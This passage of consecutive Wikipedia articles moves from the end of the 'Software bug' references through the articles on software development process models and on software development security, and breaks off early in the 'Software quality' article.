^ Chris Vander Mey (August 24, 2012). Shipping Greatness - Practical Lessons on Building and Launching Outstanding Software, Learned on the Job at Google and Amazon. O'Reilly Media. pp. 79–81. ISBN 9781449336608.

^ Soleimani Neysiani, Behzad; Babamir, Seyed Morteza; Aritsugi, Masayoshi (October 1, 2020). "Efficient feature extraction model for validation performance improvement of duplicate bug report detection in software bug triage systems". Information and Software Technology. 126: 106344. doi:10.1016/j.infsof.2020.106344. S2CID 219733047.

^ "5.3. Anatomy of a Bug". bugzilla.org. Archived from the original on May 23, 2013.

^ Jones, Wilbur D. Jr., ed. (1989). "Show stopper". Glossary: defense acquisition acronyms and terms (4 ed.). Fort Belvoir, Virginia, USA: Department of Defense, Defense Systems Management College. p. 123. hdl:2027/mdp.39015061290758 – via Hathitrust.

^ a b Zachary, G. Pascal (1994). Show-stopper!: the breakneck race to create Windows NT and the next generation at Microsoft. New York: The Free Press. p. 158. ISBN 0029356717 – via archive.org.

^ "The Next Generation 1996 Lexicon A to Z: Slipstream Release". Next Generation. No. 15. March 1996. p. 41.

^ Carr, Nicholas (2018). "'It's Not a Bug, It's a Feature.' Trite—or Just Right?". wired.com.

^ Di Franco, Anthony; Guo, Hui; Cindy, Rubio-González. "A Comprehensive Study of Real-World Numerical Bug Characteristics" (PDF). Archived (PDF) from the original on October 9, 2022.

^ Kimbler, K. (1998). Feature Interactions in Telecommunications and Software Systems V. IOS Press. p. 8. ISBN 978-90-5199-431-5.

^ Syed, Mahbubur Rahman (July 1, 2001). Multimedia Networking: Technology, Management and Applications: Technology, Management and Applications. Idea Group Inc (IGI). p. 398. ISBN 978-1-59140-005-9.

^ Wu, Chwan-Hwa (John); Irwin, J. David (April 19, 2016). Introduction to Computer Networks and Cybersecurity. CRC Press. p. 500. ISBN 978-1-4665-7214-0.

^ RFC 1263: "TCP Extensions Considered Harmful" quote: "the time to distribute the new version of the protocol to all hosts can be quite long (forever in fact). ... If there is the slightest incompatibly between old and new versions, chaos can result."

^ Lientz, B. P.; Swanson, E. B.; Tompkins, G. E. (1978). "Characteristics of Application Software Maintenance". Communications of the ACM. 21 (6): 466–471. doi:10.1145/359511.359522. S2CID 14950091.

^ Amit, Idan; Feitelson, Dror G. (2020). "The Corrective Commit Probability Code Quality Metric". arXiv:2007.10912 [cs.SE].

^ An overview of the Software Engineering Laboratory (PDF) (Report). Maryland, USA: Goddard Space Flight Center, NASA. December 1, 1994. pp41–42 Figure 18; pp43–44 Figure 21. CR-189410; SEL-94-005. Archived (PDF) from the original on November 22, 2022. Retrieved November 22, 2022. (bibliography: An overview of the Software Engineering Laboratory)

^ a b Cobb, Richard H.; Mills, Harlan D. (1990). "Engineering software under statistical quality control". IEEE Software. 7 (6): 46. doi:10.1109/52.60601. ISSN 1937-4194. S2CID 538311 – via University of Tennessee – Harlan D. Mills Collection.

^ McConnell, Steven C. (1993). Code Complete. Redmond, Washington, USA: Microsoft Press. p. 611. ISBN 9781556154843 – via archive.org. (Cobb and Mills 1990)

^ Holzmann, Gerard (March 6, 2009). "Appendix D – Software Complexity" (PDF).  In Dvorak, Daniel L. (ed.). NASA Study on Flight Software Complexity (Report). NASA. pdf frame 109/264. Appendix D p.2. Archived (PDF) from the original on March 8, 2022. Retrieved November 22, 2022. (under NASA Office of the Chief Engineer Technical Excellence Initiative)

^ Ullman, Ellen (2004). The Bug. Picador. ISBN 978-1-250-00249-5.


External links[edit]



MediaWiki has documentation related to: Bug management

"Common Weakness Enumeration" – an expert webpage focus on bugs, at NIST.gov
BUG type of Jim Gray – another Bug type
Picture of the "first computer bug" at the Wayback Machine (archived January 12, 2015)
"The First Computer Bug!" – an email from 1981 about Adm. Hopper's bug
"Toward Understanding Compiler Bugs in GCC and LLVM". A 2016 study of bugs in compilers
Authority control: National libraries 
Israel
United States





Retrieved from "https://en.wikipedia.org/w/index.php?title=Software_bug&oldid=1136053014"
Categories: Software bugsHidden categories: CS1 maint: unfit URLWebarchive template wayback linksCS1 errors: missing periodicalPages containing links to subscription-only contentArticles with short descriptionShort description is different from WikidataUse mdy dates from April 2020All articles with unsourced statementsArticles with unsourced statements from February 2017Articles with unsourced statements from November 2012Articles needing cleanup from August 2015All pages needing cleanupArticles with sections that need to be turned into prose from August 2015Articles with J9U identifiersArticles with LCCN identifiers
 



From Wikipedia, the free encyclopedia


Process by which software is developed
This article needs additional citations for verification. Please help improve this article by adding citations to reliable sources. Unsourced material may be challenged and removed.Find sources: "Software development process" – news · newspapers · books · scholar · JSTOR (December 2010) (Learn how and when to remove this template message)


Part of a series onSoftware development
Core activities
Processes
Requirements
Design
Construction
Engineering
Testing
Debugging
Deployment
Maintenance

Paradigms and models
Software engineering
Agile
Cleanroom
Incremental
Prototyping
Spiral
V model
Waterfall

Methodologies and frameworks
ASD
DevOps
DAD
DSDM
FDD
IID
Kanban
Lean SD
LeSS
MDD
MSF
PSP
RAD
RUP
SAFe
Scrum
SEMAT
TDD
TSP
OpenUP
UP
XP

Supporting disciplines
Configuration management
Documentation
Software quality assurance
Project management
User experience

Practices
ATDD
BDD
CCO
CI
CD
DDD
PP
SBE
Stand-up
TDD

Tools
Compiler
Debugger
Profiler
GUI designer
Modeling
IDE
Build automation
Release automation
Infrastructure as code

Standards and bodies of knowledge
BABOK
CMMI
IEEE standards
ISO 9001
ISO/IEC standards
PMBOK
SWEBOK
ITIL
IREB

Glossaries
Artificial intelligence
Computer science
Electrical and electronics engineering

Outlines
Outline of software development
vte
In software engineering, a software development process is a process of dividing software development work into smaller, parallel, or sequential steps or sub-processes to improve design and/or product management.  It is also known as a software development life cycle (SDLC).  The methodology may include the pre-definition of specific deliverables and artifacts that are created and completed by a project team to develop or maintain an application.[1]
Most modern development processes can be vaguely described as agile. Other methodologies include waterfall, prototyping, iterative and incremental development, spiral development, rapid application development, and extreme programming.
A life-cycle "model" is sometimes considered a more general term for a category of methodologies and a software development "process" a more specific term to refer to a specific process chosen by a specific organization.[citation needed] For example, there are many specific software development processes that fit the spiral life-cycle model. The field is often considered a subset of the systems development life cycle.


History[edit]
The software development methodology (also known as SDM) framework didn't emerge until the 1960s. According to Elliott (2004), the systems development life cycle (SDLC) can be considered to be the oldest formalized methodology framework for building information systems. The main idea of the SDLC has been "to pursue the development of information systems in a very deliberate, structured and methodical way, requiring each stage of the life cycle––from the inception of the idea to delivery of the final system––to be carried out rigidly and sequentially"[2] within the context of the framework being applied. The main target of this methodology framework in the 1960s was "to develop large scale functional business systems in an age of large scale business conglomerates. Information systems activities revolved around heavy data processing and number crunching routines".[2]
Methodologies, processes, and frameworks range from specific prescriptive steps that can be used directly by an organization in day-to-day work, to flexible frameworks that an organization uses to generate a custom set of steps tailored to the needs of a specific project or group.  In some cases, a "sponsor" or "maintenance" organization distributes an official set of documents that describe the process.  Specific examples include:

1970s
Structured programming since 1969
Cap Gemini SDM, originally from PANDATA, the first English translation was published in 1974. SDM stands for System Development Methodology
1980s
Structured systems analysis and design method (SSADM) from 1980 onwards
Information Requirement Analysis/Soft systems methodology
1990s
Object-oriented programming (OOP) developed in the early 1960s and became a dominant programming approach during the mid-1990s
Rapid application development (RAD), since 1991
Dynamic systems development method (DSDM), since 1994
Scrum, since 1995
Team software process, since 1998
Rational Unified Process (RUP), maintained by IBM since 1998
Extreme programming, since 1999
2000s
Agile Unified Process (AUP) maintained since 2005 by Scott Ambler
Disciplined agile delivery (DAD) Supersedes AUP
2010s

Scaled Agile Framework (SAFe)
Large-Scale Scrum (LeSS)
DevOps
It is notable that since DSDM in 1994, all of the methodologies on the above list except RUP have been agile methodologies - yet many organizations, especially governments, still use pre-agile processes (often waterfall or similar). Software process and software quality are closely interrelated; some unexpected facets and effects have been observed in practice  [3]
Among these, another software development process has been established in open source. The adoption of these best practices known and established processes within the confines of a company is called inner source.

Prototyping[edit]
Software prototyping is about creating prototypes, i.e. incomplete versions of the software program being developed.
The basic principles are:[1]

Prototyping is not a standalone, complete development methodology, but rather an approach to try out particular features in the context of a full methodology (such as incremental, spiral, or rapid application development (RAD)).
Attempts to reduce inherent project risk by breaking a project into smaller segments and providing more ease-of-change during the development process.
The client is involved throughout the development process, which increases the likelihood of client acceptance of the final implementation.
While some prototypes are developed with the expectation that they will be discarded, it is possible in some cases to evolve from prototype to working system.
A basic understanding of the fundamental business problem is necessary to avoid solving the wrong problems, but this is true for all software methodologies.

Methodologies[edit]
Agile development[edit]
Main article: Agile software development
"Agile software development" refers to a group of software development frameworks based on iterative development, where requirements and solutions evolve via collaboration between self-organizing cross-functional teams. The term was coined in the year 2001 when the Agile Manifesto was formulated.
Agile software development uses iterative development as a basis but advocates a lighter and more people-centric viewpoint than traditional approaches. Agile processes fundamentally incorporate iteration and the continuous feedback that it provides to successively refine and deliver a software system.
The Agile model also includes the following software development processes:[4]

Dynamic systems development method (DSDM)
Kanban
Scrum
Crystal
Atern
Lean software development
Continuous integration[edit]
Main article: Continuous integration
Continuous integration is the practice of merging all developer working copies to a shared mainline several times a day.[5] Grady Booch first named and proposed CI in his 1991 method,[6] although he did not advocate integrating several times a day. Extreme programming (XP) adopted the concept of CI and did advocate integrating more than once per day – perhaps as many as tens of times per day.

Incremental development[edit]
Main article: Iterative and incremental development
Various methods are acceptable for combining linear and iterative systems development methodologies, with the primary objective of each being to reduce inherent project risk by breaking a project into smaller segments and providing more ease-of-change during the development process.
There are three main variants of incremental development:[1]

A series of mini-Waterfalls are performed, where all phases of the Waterfall are completed for a small part of a system, before proceeding to the next increment, or
Overall requirements are defined before proceeding to evolutionary, mini-Waterfall development of individual increments of a system, or
The initial software concept, requirements analysis, and design of architecture and system core are defined via Waterfall, followed by incremental implementation, which culminates in installing the final version, a working system.
Rapid application development[edit]
Main article: Rapid application development
 Rapid Application Development (RAD) Model
Rapid application development (RAD) is a software development methodology, which favors iterative development and the rapid construction of prototypes instead of large amounts of up-front planning. The "planning" of software developed using RAD is interleaved with writing the software itself. The lack of extensive pre-planning generally allows software to be written much faster, and makes it easier to change requirements.
The rapid development process starts with the development of preliminary data models and business process models using structured techniques. In the next stage, requirements are verified using prototyping, eventually to refine the data and process models. These stages are repeated iteratively; further development results in "a combined business requirements and technical design statement to be used for constructing new systems".[7]
The term was first used to describe a software development process introduced by James Martin in 1991.  According to Whitten (2003), it is a merger of various structured techniques, especially data-driven information technology engineering, with prototyping techniques to accelerate software systems development.[7]
The basic principles of rapid application development are:[1]

Key objective is for fast development and delivery of a high quality system at a relatively low investment cost.
Attempts to reduce inherent project risk by breaking a project into smaller segments and providing more ease-of-change during the development process.
Aims to produce high quality systems quickly, primarily via iterative Prototyping (at any stage of development), active user involvement, and computerized development tools. These tools may include Graphical User Interface (GUI) builders, Computer Aided Software Engineering (CASE) tools, Database Management Systems (DBMS), fourth-generation programming languages, code generators, and object-oriented techniques.
Key emphasis is on fulfilling the business need, while technological or engineering excellence is of lesser importance.
Project control involves prioritizing development and defining delivery deadlines or “timeboxes”. If the project starts to slip, emphasis is on reducing requirements to fit the timebox, not in increasing the deadline.
Generally includes joint application design (JAD), where users are intensely involved in system design, via consensus building in either structured workshops, or electronically facilitated interaction.
Active user involvement is imperative.
Iteratively produces production software, as opposed to a throwaway prototype.
Produces documentation necessary to facilitate future development and maintenance.
Standard systems analysis and design methods can be fitted into this framework.
Waterfall development[edit]
Main article: Waterfall model
 The activities of the software development process represented in the waterfall model. There are several other models to represent this process.
The waterfall model is a sequential development approach, in which development is seen as flowing steadily downwards (like a waterfall) through several phases, typically:

Requirements analysis resulting in a software requirements specification
Software design
Implementation
Testing
Integration, if there are multiple subsystems
Deployment (or Installation)
Maintenance
The first formal description of the method is often cited as an article published by Winston W. Royce[8] in 1970, although Royce did not use the term "waterfall" in this article. Royce presented this model as an example of a flawed, non-working model.[9]
The basic principles are:[1]

The Project is divided into sequential phases, with some overlap and splash back acceptable between phases.
Emphasis is on planning, time schedules, target dates, budgets, and implementation of an entire system at one time.
Tight control is maintained over the life of the project via extensive written documentation, formal reviews, and approval/signoff by the user and information technology management occurring at the end of most phases before beginning the next phase.  Written documentation is an explicit deliverable of each phase.
The waterfall model is a traditional engineering approach applied to software engineering. A strict waterfall approach discourages revisiting and revising any prior phase once it is complete.[according to whom?] This "inflexibility" in a pure waterfall model has been a source of criticism by supporters of other more "flexible" models.  It has been widely blamed for several large-scale government projects running over budget, over time and sometimes failing to deliver on requirements due to the Big Design Up Front approach.[according to whom?] Except when contractually required, the waterfall model has been largely superseded by more flexible and versatile methodologies developed specifically for software development.[according to whom?] See Criticism of Waterfall model.

Spiral development[edit]
 Spiral model (Boehm, 1988)
Main article: Spiral model
In 1988, Barry Boehm published a formal software system development "spiral model," which combines some key aspects of the waterfall model and rapid prototyping methodologies, in an effort to combine advantages of top-down and bottom-up concepts.  It provided emphasis in a key area many felt had been neglected by other methodologies: deliberate iterative risk analysis, particularly suited to large-scale complex systems.
The basic principles are:[1]

Focus is on risk assessment and on minimizing project risk by breaking a project into smaller segments and providing more ease-of-change during the development process, as well as providing the opportunity to evaluate risks and weigh consideration of project continuation throughout the life cycle.
"Each cycle involves a progression through the same sequence of steps, for each part of the product and for each of its levels of elaboration, from an overall concept-of-operation document down to the coding of each individual program."[10]
Each trip around the spiral traverses four basic quadrants: (1) determine objectives, alternatives, and constraints of the iteration, and (2) evaluate alternatives; Identify and resolve risks; (3) develop and verify deliverables from the iteration; and (4) plan the next iteration.[11]
Begin each cycle with an identification of stakeholders and their "win conditions", and end each cycle with review and commitment.[12]
Shape Up[edit]
Shape Up is a software development approach introduced by Basecamp in 2018. It is a set of principles and techniques that Basecamp developed internally to overcome the problem of projects dragging on with no clear end. Its primary target audience is remote teams. Shape Up has no estimation and velocity tracking, backlogs, or sprints, unlike Waterfall, Agile, or Scrum. Instead, those concepts are replaced with appetite, betting, and cycles. As of 2022, besides Basecamp, notable organizations that have adopted Shape Up include UserVoice and Block.[13][14]

Cycles[edit]
Through trials and errors, Basecamp found that the ideal cycle length is 6 weeks. This 6 week period is long enough to build a meaningful feature and still short enough to induce a sense of urgency.

Shaping[edit]
Shaping is the process of preparing work before being handed over to designers and engineers. Shaped work spells out the solution's main UI elements, identifies rabbit holes, and outlines clear scope boundaries. It is meant to be rough and to leave finer details for builders (designers and engineers) to solve, allowing the builders to exercise their creativity and make trade-offs.[15] Shaped work is documented in the form of a pitch using an online document solution that supports commenting, allowing team members to contribute technical information asynchronously. Such comments are crucial for uncovering hidden surprises that may derail the project.
Before a cycle begins, stakeholders hold a betting table, where pitches are reviewed. For each pitch, a decision is made to either bet on it or drop it.[16]

Appetite[edit]
The way Shape Up determines how much time is allocated to a project is diametrically opposed to other methodologies. Shape Up starts with an appetite (for example, 6 weeks) and ends with a solution design that can be delivered within this constraint. The appetite becomes a hard deadline for the project's builders.[17]

Building[edit]
Shape Up is a two-track system where shapers and builders work in parallel. Work that is being shaped in the current cycle may be given to designers and engineers to build in a future cycle.
Recognizing the technical uncertainties that come with building, progress is tracked using a chart that visualizes the metaphor of the hill, aptly named the hill chart. The uphill phase is where builders are still working out their approach, while the downhill is where unknowns have been eliminated. Builders proactively and asynchronously self-report progress using an interactive online hill chart on Basecamp or Jira, shifting focus from done or not-done statuses to unknown or solved problems. The use of hill chart replaces the process of reporting linear statuses in scrum or Kanban standup.[18][19]

Advanced methodologies[edit]
Other high-level software project methodologies include:

Behavior-driven development and business process management.[20]
Chaos model - The main rule always resolve the most important issue first.
Incremental funding methodology - an iterative approach
Lightweight methodology - a general term for methods that only have a few rules and practices
Structured systems analysis and design method - a specific version of waterfall
Slow programming, as part of the larger Slow Movement, emphasizes careful and gradual work without (or minimal) time pressures. Slow programming aims to avoid bugs and overly quick release schedules.
V-Model (software development) - an extension of the waterfall model
Unified Process (UP) is an iterative software development methodology framework, based on Unified Modeling Language (UML). UP organizes the development of software into four phases, each consisting of one or more executable iterations of the software at that stage of development: inception, elaboration, construction, and guidelines. Many tools and products exist to facilitate UP implementation. One of the more popular versions of UP is the Rational Unified Process (RUP).
Big Bang methodology - an approach for small or undefined projects, generally consisting of little to no planning with high risk.
Process meta-models[edit]
Some "process models" are abstract descriptions for evaluating, comparing, and improving the specific process adopted by an organization.

ISO/IEC 12207 is the international standard describing the method to select, implement, and monitor the life cycle for software.
The Capability Maturity Model Integration (CMMI) is one of the leading models and is based on best practices. Independent assessments grade organizations on how well they follow their defined processes, not on the quality of those processes or the software produced. CMMI has replaced CMM.
ISO 9000 describes standards for a formally organized process to manufacture a product and the methods of managing and monitoring progress. Although the standard was originally created for the manufacturing sector, ISO 9000 standards have been applied to software development as well. Like CMMI, certification with ISO 9000 does not guarantee the quality of the end result, only that formalized business processes have been followed.
ISO/IEC 15504 Information technology—Process assessment is also known as Software Process Improvement Capability Determination (SPICE), is a "framework for the assessment of software processes". This standard is aimed at setting out a clear model for process comparison. SPICE is used much like CMMI. It models processes to manage, control, guide and monitors software development. This model is then used to measure what a development organization or project team actually does during software development. This information is analyzed to identify weaknesses and drive improvement. It also identifies strengths that can be continued or integrated into common practice for that organization or team.
ISO/IEC 24744 Software Engineering—Metamodel for Development Methodologies, is a power type-based metamodel for software development methodologies.
SPEM 2.0 by the Object Management Group.
Soft systems methodology - a general method for improving management processes.
Method engineering - a general method for improving information system processes.
Further information: Process patterns
In practice[edit]
 The three basic approaches applied to software development methodology frameworks.
A variety of such frameworks have evolved over the years, each with its own recognized strengths and weaknesses. One software development methodology framework is not necessarily suitable for use by all projects. Each of the available methodology frameworks is best suited to specific kinds of projects, based on various technical, organizational, project, and team considerations.[1]
Software development organizations implement process methodologies to ease the process of development. Sometimes, contractors may require methodologies employed, an example is the U.S. defense industry, which requires a rating based on process models to obtain contracts.  The international standard for describing the method of selecting, implementing, and monitoring the life cycle for software is ISO/IEC 12207.
A decades-long goal has been to find repeatable, predictable processes that improve productivity and quality. Some try to systematize or formalize the seemingly unruly task of designing software. Others apply project management techniques to designing software. Large numbers of software projects do not meet their expectations in terms of functionality, cost, or delivery schedule - see List of failed and overbudget custom software projects for some notable examples.
Organizations may create a Software Engineering Process Group (SEPG), which is the focal point for process improvement. Composed of line practitioners who have varied skills, the group is at the center of the collaborative effort of everyone in the organization who is involved with software engineering process improvement.
A particular development team may also agree to program environment details, such as which integrated development environment is used one or more dominant programming paradigms, programming style rules, or choice of specific software libraries or software frameworks.  These details are generally not dictated by the choice of model or general methodology.

 Software development life cycle (SDLC)
See also[edit]
Systems development life cycle
Computer-aided software engineering (some of these tools support specific methodologies)
List of software development philosophies
Outline of software engineering
OpenUP
Project management
Software development
Software development effort estimation
Software release life cycle
Top-down and bottom-up design#Computer science
References[edit]


^ a b c d e f g Centers for Medicare & Medicaid Services (CMS) Office of Information Service (2008). Selecting a development approach. Webarticle. United States Department of Health and Human Services (HHS). Re-validated: March 27, 2008.  Retrieved 27 Oct 2008.

^ a b Geoffrey Elliott (2004) Global Business Information Technology: an integrated systems approach. Pearson Education. p.87.

^ Suryanarayana, Girish (2015). "Software Process versus Design Quality: Tug of War?". IEEE Software. 32 (4): 7–11. doi:10.1109/MS.2015.87.

^ "software development process". 19 August 2020.

^ "Continuous Integration".

^ Booch, Grady (1991). Object Oriented Design: With Applications. Benjamin Cummings. p. 209. ISBN 9780805300918. Retrieved 18 August 2014.

^ a b Whitten, Jeffrey L.; Lonnie D. Bentley, Kevin C. Dittman. (2003). Systems Analysis and Design Methods. 6th edition. ISBN 0-256-19906-X.

^ Wasserfallmodell > Entstehungskontext, Markus Rerych, Institut für Gestaltungs- und Wirkungsforschung, TU-Wien. Accessed on line November 28, 2007.

^ Conrad Weisert, Waterfall methodology: there's no such thing!

^ Barry Boehm (1996)., "A Spiral Model of Software Development and Enhancement". In: ACM SIGSOFT Software Engineering Notes (ACM) 11(4):14-24, August 1986

^ Richard H. Thayer, Barry W. Boehm (1986). Tutorial: software engineering project management. Computer Society Press of the IEEE. p.130

^ Barry W. Boehm (2000). Software cost estimation with Cocomo II: Volume 1.

^ "Foreword by Jason Fried | Shape Up". basecamp.com. Retrieved 2022-09-11.

^ "Is Shape Up just a nice theory?". Curious Lab. Retrieved 2022-09-12.

^ "Principles of Shaping | Shape Up". basecamp.com. Retrieved 2022-09-11.

^ "Bets, Not Backlogs | Shape Up". basecamp.com. Retrieved 2022-09-11.

^ "Hand Over Responsibility | Shape Up". basecamp.com. Retrieved 2022-09-11.

^ "Show Progress | Shape Up". basecamp.com. Retrieved 2022-09-12.

^ "Atlassian Marketplace". marketplace.atlassian.com. Retrieved 2022-09-12.

^ Lübke, Daniel; van Lessen, Tammo (2016). "Modeling Test Cases in BPMN for Behavior-Driven Development". IEEE Software. 33 (5): 15–21. doi:10.1109/MS.2016.117. S2CID 14539297.


External links[edit]



Wikimedia Commons has media related to Software development methodology.

Selecting a development approach at cms.hhs.gov.
Gerhard Fischer, "The Software Technology of the 21st Century: From Software Reuse to Collaborative Software Design", 2001
Subway map of agile practices at Agile Alliance
vteSoftware engineeringFields
Computer programming
DevOps
Requirements engineering
Site reliability engineering
Software deployment
Software design
Software maintenance
Software testing
Systems analysis
Formal methods
Concepts
Data modeling
Enterprise architecture
Functional specification
Modeling language
Programming paradigm
Software
Software archaeology
Software architecture
Software configuration management
Software development process/methodology
Software quality
Software quality assurance
Software verification and validation
Structured analysis
Essential Analysis
CI/CD
Orientations
Agile
Aspect-oriented
Object orientation
Ontology
Service orientation
SDLC
ModelsDevelopmental
Agile
EUP
Executable UML
Incremental model
Iterative model
Prototype model
RAD
UP
Scrum
Spiral model
V-Model
Waterfall model
XP
Other
SPICE
CMMI
Data model
ER model
Function model
Information model
Metamodeling
Object model
Systems model
View model
Languages
IDEF
UML
USL
SysML
Related fields
Computer science
Computer engineering
Information science
Project management
Risk management
Systems engineering

 Commons
 Category





Retrieved from "https://en.wikipedia.org/w/index.php?title=Software_development_process&oldid=1133929573"
Categories: Software development processMethodologySoftware engineeringHidden categories: Articles with short descriptionShort description matches WikidataArticles needing additional references from December 2010All articles needing additional referencesUse American English from April 2022All Wikipedia articles written in American EnglishAll articles with unsourced statementsArticles with unsourced statements from September 2020All articles with specifically marked weasel-worded phrasesArticles with specifically marked weasel-worded phrases from January 2021Commons category link is on Wikidata
 



From Wikipedia, the free encyclopedia


Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
Security, as part of the software development process, is an ongoing process involving people and practices, and ensures application confidentiality, integrity, and availability. Secure software is the result of security aware software development processes where security is built in and thus software is developed with security in mind.[1]
Security is most effective if planned and managed throughout every stage of software development life cycle (SDLC), especially in critical applications or those that process sensitive information.
The solution to software development security is more than just the technology.


Software development challenges[edit]
As technology advances, application environments become more complex and application development security becomes more challenging. Applications, systems, and networks are constantly under various security attacks such as malicious code or denial of service. Some of the challenges from the application development security point of view include Viruses, Trojan horses, Logic bombs, Worms, Agents, and Applets.[2]
Applications can contain security vulnerabilities that may be introduced by software engineers either intentionally or carelessly.
Software, environmental, and hardware controls are required although they cannot prevent problems created from poor programming practice. Using limit and sequence checks to validate users’ input will improve the quality of data. Even though programmers may follow best practices, an application can still fail due to unpredictable conditions and therefore should handle unexpected failures successfully by first logging all the information it can capture in preparation for auditing. As security increases, so does the relative cost and administrative overhead.
Applications are typically developed using high-level programming languages which in themselves can have security implications. The core activities essential to the software development process to produce secure applications and systems include: conceptual definition, functional requirements, control specification, design review, code review and walk-through, system test review, and maintenance and change management.
Building secure software is not only the responsibility of a software engineer but also the responsibility of the stakeholders which include: management, project managers, business analysts, quality assurance managers, technical architects, security specialists, application owners, and developers.

Basic principles[edit]
There are a number of basic guiding principles to software security. Stakeholders’ knowledge of these and how they may be implemented in software is vital to software security. These include:

Protection from disclosure
Protection from alteration
Protection from destruction
Who is making the request
What rights and privileges does the requester have
Ability to build historical evidence
Management of configuration, sessions and errors/exceptions
Basic practices[edit]
The following lists some of the recommended web security practices that are more specific for software developers.

Sanitize inputs at the client side and server side
Encode request/response
Use HTTPS for domain entries
Use only current encryption and hashing algorithms
Do not allow for directory listing
Do not store sensitive data inside cookies
Check the randomness of the session
Set secure and HttpOnly flags in cookies
Use TLS not SSL
Set strong password policy
Do not store sensitive information in a form’s hidden fields
Verify file upload functionality
Set secure response headers
Make sure third party libraries are secured
Hide web server information
Security testing[edit]
Common attributes of security testing include authentication, authorization, confidentiality, availability, integrity, non-repudiation, and resilience. Security testing is essential to ensure that the system prevents unauthorized users to access its resources and data. Some application data is sent over the internet which travels through a series of servers and network devices. This gives ample opportunities to unscrupulous hackers.

Summary[edit]
All secure systems implement security controls within the software, hardware, systems, and networks - each component or process has a layer of isolation to protect an organization's most valuable resource which is its data. There are various security controls that can be incorporated into an application's development process to ensure security and prevent unauthorized access.

References[edit]


^ Securing Enterprise Web Applications at the Source: An Application Security Perspective, OWASP

^ Stewart, James (2012). CISSP Certified Information Systems Security Professional Study Guide Sixth Edition. Canada: John Wiley & Sons, Inc. pp. 275–319. ISBN 978-1-118-31417-3.


Stewart, James (2012). CISSP Certified Information Systems Security Professional Study Guide Sixth Edition. Canada: John Wiley & Sons, Inc. pp. 275–319. ISBN 978-1-118-31417-3.
Report from Dagstuhl Seminar 12401Web Application Security Edited by Lieven Desmet, Martin Johns, Benjamin Livshits, and Andrei Sabelfeld, http://research.microsoft.com/en-us/um/people/livshits/papers%5Ctr%5Cdagrep_s12401.pdf
Web Application Security Consortium, The 80/20 Rule for Web Application Security by Jeremiah Grossman 2005, http://www.webappsec.org/projects/articles/013105.shtml
Wikipedia Web Application Security page, Web application security
Web Security Wiki page, https://www.w3.org/Security/wiki/Main_Page
Wikipedia Web Security Exploits page, Category:Web security exploits
Open Web Application Security Project (OWASP), https://www.owasp.org/index.php/Main_Page
Wikipedia Network Security page, Network security
Open Web Application Security Project (OWASP) web site, https://www.owasp.org/images/8/83/Securing_Enterprise_Web_Applications_at_the_Source.pdf
vteSoftware qualityQualitiesInternal
Size
Maintainability
Flexibility
Portability
Reusability
Readability
Scalability
Testability
Understandability
Loose coupling
Orthogonality
External
Usability
Reliability
Adaptability
Correctness
Accuracy
Efficiency
Robustness
Security
Safety
Standards and lists
ISO/IEC 9126
Non-functional requirements
List of system quality attributes
Processes
Software quality management
Software quality control
Software quality assurance


 Commons





Retrieved from "https://en.wikipedia.org/w/index.php?title=Software_development_security&oldid=1043021857"
Categories: Software developmentSoftware quality
 



From Wikipedia, the free encyclopedia


Refers to two related but distinct notions: functional quality and structural quality
This article needs additional citations for verification. Please help improve this article by adding citations to reliable sources. Unsourced material may be challenged and removed.Find sources: "Software quality" – news · newspapers · books · scholar · JSTOR (December 2021) (Learn how and when to remove this template message)
In the context of software engineering, software quality refers to two related but distinct notions:[citation needed]

Software functional quality reflects how well it complies with or conforms to a given design, based on functional requirements or specifications.[1] That attribute can also be described as the fitness for purpose of a piece of software or how it compares to competitors in the marketplace as a worthwhile product.[2] It is the degree to which the correct software was produced.
Software structural quality refers to how it meets non-functional requirements that support the delivery of the functional requirements, such as robustness or maintainability. It has a lot more to do with the degree to which the software works as needed.
Many aspects of structural quality can be evaluated only statically through the analysis of the software inner structure, its source code (see Software metrics),[3] at the unit level, system level (sometimes referred to as end-to-end testing[4]), which is in effect how its architecture adheres to sound principles of software architecture outlined in a paper on the topic by Object Management Group (OMG).[5]
However some structural qualities, such as usability, can be assessed only dynamically (users or others acting in their behalf interact with the software or, at least, some prototype or partial implementation; even the interaction with a mock version made in cardboard represents a dynamic test because such version can be considered a prototype). Other aspects, such as reliability, might involve not only the software but also the underlying hardware, therefore, it can be assessed both statically and dynamically (stress test).[citation needed]
Functional quality is typically assessed dynamically but it is also possible to use static tests (such as software reviews).[citation needed]
Historically, the structure, classification and terminology of attributes and metrics applicable to software quality management have been derived or extracted from the ISO 9126 and the subsequent ISO/IEC 25000 standard.[6] Based on these models (see Models), the Consortium for IT Software Quality (CISQ) has defined five major desirable structural characteristics needed for a piece of software to provide business value:[7] Reliability, Efficiency, Security, Maintainability and (adequate) Size.[8][9][10]
Software quality measurement quantifies to what extent a software program or system rates along each of these five dimensions. An aggregated measure of software quality can be computed through a qualitative or a quantitative scoring scheme or a mix of both and then a weighting system reflecting the priorities. This view of software quality being positioned on a linear continuum is supplemented by the analysis of "critical programming errors" that under specific circumstances can lead to catastrophic outages or performance degradations that make a given system unsuitable for use regardless of rating based on aggregated measurements. Such programming errors found at the system level represent up to 90 percent of production issues, whilst at the unit-level, even if far more numerous, programming errors account for less than 10 percent of production issues (see also Ninety–ninety rule). As a consequence, code quality without the context of the whole system, as W. Edwards Deming described it, has limited value.[citation needed]
